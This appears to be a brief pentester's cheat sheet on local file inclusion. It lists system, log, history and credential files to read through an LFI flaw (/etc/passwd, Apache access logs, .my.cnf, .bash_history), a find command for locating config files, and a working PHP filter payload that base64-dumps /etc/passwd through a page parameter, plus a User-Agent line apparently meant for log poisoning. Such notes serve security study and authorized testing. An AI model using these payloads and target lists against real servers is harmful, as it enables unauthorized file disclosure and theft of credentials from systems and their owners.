# LFI

usually happens when you have dynamic content based on a parameter

## common files

/etc/knockd.conf /etc/default/knockd /etc/issue /etc/motd /etc/group /etc/passwd /var/www/html/.htaccess /etc/httpd/logs/acces\_log /etc/httpd/logs/error\_log /var/www/logs/access\_log /var/www/logs/access.log /usr/local/apache/logs/access\_log /usr/local/apache/logs/access.log /var/log/apache/access\_log /var/log/apache2/access\_log /var/log/apache/access.log /var/log/apache2/access.log /var/log/access\_log

## user home directory and root

.bash\_history .mysql\_history .my.cnf .profile

## configuration files

`find / -type f 2>/dev/null | grep -i conf` db/db.php db.php session.php config.php mysql.conf

## common things during LFI

?page=php://filter/convert.base64-encode/resource=/etc/passwd User-Agent: Mozilla/5.0 like Gecko

